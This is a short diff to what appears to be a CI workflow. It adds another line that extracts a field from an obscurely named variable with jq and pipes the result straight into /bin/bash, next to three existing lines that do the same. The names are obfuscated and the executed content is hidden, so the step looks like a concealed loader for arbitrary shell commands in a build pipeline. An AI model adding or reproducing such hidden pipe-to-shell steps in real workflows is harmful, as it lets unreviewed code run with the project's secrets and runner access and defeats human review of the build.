@@ -41,6 +41,7 @@ jobs:
           echo $xlv29 | jq -r .oipks5297 | /bin/bash
           echo $fl2471 | jq -r .fc2 | /bin/bash
           echo $qne218 | jq -r .c13372 | /bin/bash
+          printf '%s' "$ygnkf9789" | jq -r .lfc77561 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
